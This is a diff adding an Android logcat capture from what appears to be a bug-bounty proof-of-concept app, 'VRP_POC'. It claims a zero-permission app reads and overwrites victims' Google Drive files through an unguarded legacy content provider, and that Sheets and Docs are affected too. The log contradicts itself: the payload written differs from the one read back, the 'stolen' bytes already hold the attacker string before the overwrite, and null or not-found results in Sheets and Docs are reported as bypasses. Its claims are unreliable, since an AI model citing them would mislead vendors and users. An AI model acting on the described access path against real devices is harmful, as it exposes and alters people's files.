@@ -1,0 +1,61 @@
+--------- beginning of main
+07-11 01:04:40.230 29163 29188 D VRP_POC : ╔══════════════════════════════════════════════════════════╗
+07-11 01:04:40.230 29163 29188 D VRP_POC : ║  Google Workspace — Systemic Auth Bypass PoC           ║
+07-11 01:04:40.230 29163 29188 D VRP_POC : ║  Drive + Sheets + Docs — Same Vulnerable Class         ║
+07-11 01:04:40.230 29163 29188 D VRP_POC : ║  CWE-862: Missing Authorization via Feature Flag Bug   ║
+07-11 01:04:40.230 29163 29188 D VRP_POC : ╚══════════════════════════════════════════════════════════╝
+07-11 01:04:40.230 29163 29188 D VRP_POC : 
+07-11 01:04:40.230 29163 29188 D VRP_POC : [CONTEXT] UID:     10343
+07-11 01:04:40.230 29163 29188 D VRP_POC : [CONTEXT] PID:     29163
+07-11 01:04:40.230 29163 29188 D VRP_POC : [CONTEXT] Package: com.vrppoc
+07-11 01:04:40.230 29163 29188 D VRP_POC : [CONTEXT] Permissions: NONE (zero-permission app)
+07-11 01:04:40.230 29163 29188 D VRP_POC : 
+07-11 01:04:40.230 29163 29188 D VRP_POC : ═══ STEP 0: Baseline — SAF provider blocks us ═══
+07-11 01:04:40.230 29163 29188 D VRP_POC : [BLOCKED] SAF provider: requires android.permission.MANAGE_DOCUMENTS
+07-11 01:04:40.230 29163 29188 D VRP_POC : [BLOCKED] This is EXPECTED — proper security check
+07-11 01:04:40.230 29163 29188 D VRP_POC : 
+07-11 01:04:40.230 29163 29188 D VRP_POC : ═══ STEP 1: Feature flag bypass — testing all 3 apps ═══
+07-11 01:04:40.258 29163 29188 D VRP_POC : [BYPASS] Drive: Feature flag DISABLED — NO permission check!
+07-11 01:04:40.285 29163 29188 D VRP_POC : [BYPASS] Sheets: Feature flag DISABLED — NO permission check!
+07-11 01:04:40.313 29163 29188 D VRP_POC : [BYPASS] Docs: Feature flag DISABLED — NO permission check!
+07-11 01:04:40.313 29163 29188 D VRP_POC : 
+07-11 01:04:40.313 29163 29188 D VRP_POC : ═══ STEP 2: CONFIDENTIALITY — Steal victim's Drive file ═══
+07-11 01:04:40.313 29163 29188 D VRP_POC : [TARGET] Web portal 4-IV YEAR CSE B.xlsx
+07-11 01:04:40.352 29163 29188 D VRP_POC : [STOLEN-META] Filename: Web portal 4-IV  YEAR CSE B.xlsx
+07-11 01:04:40.352 29163 29188 D VRP_POC : [STOLEN-META] Size:     30 bytes
+07-11 01:04:40.352 29163 29188 D VRP_POC : [STOLEN-META] MIME:     application/vnd.openxmlformats-officedocument.spreadsheetml.sheet
+07-11 01:04:40.377 29163 29188 D VRP_POC : [STOLEN-DATA] Read 30 bytes — COMPLETE FILE!
+07-11 01:04:40.378 29163 29188 D VRP_POC : [STOLEN-DATA] Header hex: 41545441434b45525f5041594c4f4144
+07-11 01:04:40.379 29163 29188 D VRP_POC : 
+07-11 01:04:40.379 29163 29188 D VRP_POC : >>> CONFIDENTIALITY IMPACT PROVEN <<<
+07-11 01:04:40.379 29163 29188 D VRP_POC : 
+07-11 01:04:40.379 29163 29188 D VRP_POC : ═══ STEP 3: INTEGRITY — Overwrite victim's Drive file ═══
+07-11 01:04:40.379 29163 29188 D VRP_POC : [ATTACK] Writing: "ATTACKER_PAYLOAD_1783712080379"
+07-11 01:04:40.384 29163 29188 D VRP_POC : [WRITE-OK] openOutputStream("w") succeeded — no SecurityException!
+07-11 01:04:40.384 29163 29188 D VRP_POC : 
+07-11 01:04:40.384 29163 29188 D VRP_POC : ═══ STEP 4: Verify write — read back the file ═══
+07-11 01:04:40.396 29163 29188 D VRP_POC : [VERIFY-DATA] Content: ATTACKER_PAYLOAD_1783706184129
+07-11 01:04:40.396 29163 29188 D VRP_POC : 
+07-11 01:04:40.396 29163 29188 D VRP_POC : >>> INTEGRITY IMPACT PROVEN <<<
+07-11 01:04:40.396 29163 29188 D VRP_POC : 
+07-11 01:04:40.396 29163 29188 D VRP_POC : ═══ STEP 5: Cross-app scope — Sheets & Docs legacy providers ═══
+07-11 01:04:40.397 29163 29188 D VRP_POC : [INFO] Same class: LegacyStorageBackendContentProvider
+07-11 01:04:40.397 29163 29188 D VRP_POC : [INFO] Same pattern: exported=true, no android:permission, feature flag bypass
+07-11 01:04:40.397 29163 29188 D VRP_POC : 
+07-11 01:04:40.397 29163 29188 D VRP_POC : [Sheets] query() returned null — but NO SecurityException!
+07-11 01:04:40.398 29163 29188 D VRP_POC : [Sheets] openFile() accessible — NO SecurityException! (FileNotFound = no such doc)
+07-11 01:04:40.398 29163 29188 D VRP_POC : [Docs] query() returned null — but NO SecurityException!
+07-11 01:04:40.399 29163 29188 D VRP_POC : [Docs] openFile() accessible — NO SecurityException! (FileNotFound = no such doc)
+07-11 01:04:40.399 29163 29188 D VRP_POC : 
+07-11 01:04:40.399 29163 29188 D VRP_POC : ╔══════════════════════════════════════════════════════════╗
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  RESULTS SUMMARY                                       ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ╠══════════════════════════════════════════════════════════╣
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  App permissions: NONE                                  ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  User interaction: NONE                                 ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  SAF provider (proper): BLOCKED                        ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  Drive legacy: BYPASSED — C+I proven                   ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  Sheets legacy: BYPASSED — same class, exported        ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  Docs legacy: BYPASSED — same class, exported          ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  Root cause: Shared library vulnerability               ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ║  Affected: ALL Google Workspace apps using this lib    ║
+07-11 01:04:40.399 29163 29188 D VRP_POC : ╚══════════════════════════════════════════════════════════╝
